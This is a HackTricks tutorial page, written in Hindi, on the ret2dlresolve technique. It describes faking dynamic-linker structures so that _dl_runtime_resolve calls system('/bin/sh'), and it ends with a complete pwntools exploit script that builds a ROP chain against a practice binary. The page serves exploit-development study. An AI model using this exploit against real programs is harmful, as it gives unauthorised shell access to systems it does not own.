# Ret2dlresolve

{{#include ../../../banners/hacktricks-training.md}}

## Basic Information

जैसा कि [**GOT/PLT**](../arbitrary-write-2-exec/aw2exec-got-plt.md) और [**Relro**](../common-binary-protections-and-bypasses/relro.md) के पृष्ठ में समझाया गया है, बिना Full Relro के बाइनरी पहली बार उपयोग किए जाने पर प्रतीकों (जैसे बाहरी पुस्तकालयों के लिए पते) को हल करेंगे। यह समाधान **`_dl_runtime_resolve`** फ़ंक्शन को कॉल करके होता है।

**`_dl_runtime_resolve`** फ़ंक्शन स्टैक से कुछ संरचनाओं के संदर्भ लेता है जिनकी उसे निर्दिष्ट प्रतीक को हल करने के लिए आवश्यकता होती है।

इसलिए, सभी इन संरचनाओं को **फेक करना संभव है** ताकि गतिशील रूप से अनुरोधित प्रतीक (जैसे **`system`** फ़ंक्शन) को हल किया जा सके और इसे एक कॉन्फ़िगर किए गए पैरामीटर के साथ कॉल किया जा सके (जैसे **`system('/bin/sh')`**).

आमतौर पर, इन सभी संरचनाओं को एक **प्रारंभिक ROP श्रृंखला बनाकर फेक किया जाता है जो `read` को एक लिखने योग्य मेमोरी पर कॉल करता है, फिर **संरचनाएँ** और स्ट्रिंग **`'/bin/sh'`** को पास किया जाता है ताकि वे एक ज्ञात स्थान पर पढ़े जाएं, और फिर ROP श्रृंखला **`_dl_runtime_resolve`** को `$'/bin/sh'` के पते के साथ कॉल करके जारी रहती है।

> [!TIP]
> यह तकनीक विशेष रूप से उपयोगी है यदि syscall gadgets नहीं हैं (जैसे [**ret2syscall**](rop-syscall-execv.md) या [SROP](srop-sigreturn-oriented-programming.md) जैसी तकनीकों का उपयोग करने के लिए) और libc पते लीक करने के तरीके नहीं हैं।

आप इस तकनीक के बारे में बेहतर व्याख्या वीडियो के दूसरे भाग में पा सकते हैं:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## Structures

3 संरचनाओं को फेक करना आवश्यक है: **`JMPREL`**, **`STRTAB`** और **`SYMTAB`**। आप [https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve#structures](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve#structures) में इनका निर्माण कैसे किया जाता है, इसके बारे में बेहतर व्याख्या पा सकते हैं।

## Attack Summary

1. कुछ स्थान पर फेक संरचनाएँ लिखें
2. सिस्टम के पहले तर्क को सेट करें (`$rdi = &'/bin/sh'`)
3. **`_dl_runtime_resolve`** को कॉल करने के लिए स्टैक पर संरचनाओं के पते सेट करें
4. **कॉल** `_dl_runtime_resolve`
5. **`system`** को हल किया जाएगा और `'/bin/sh'` को तर्क के रूप में कॉल किया जाएगा

## Example

आप [**इस तकनीक का एक उदाहरण यहाँ**](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve/exploitation) **पाएंगे जिसमें अंतिम ROP श्रृंखला का बहुत अच्छा व्याख्या है**, लेकिन यहाँ अंतिम एक्सप्लॉइट है जो उपयोग किया गया:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = elf.process()
rop = ROP(elf)

# create the dlresolve object
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop.raw('A' * 76)
rop.read(0, dlresolve.data_addr) # read to where we want to write the fake structures
rop.ret2dlresolve(dlresolve)     # call .plt and dl-resolve() with the correct, calculated reloc_offset

log.info(rop.dump())

p.sendline(rop.chain())
p.sendline(dlresolve.payload)    # now the read is called and we pass all the relevant structures in

p.interactive()
```
## संदर्भ

- [https://youtu.be/ADULSwnQs-s](https://youtu.be/ADULSwnQs-s?feature=shared)
- [https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve)

{{#include ../../../banners/hacktricks-training.md}}
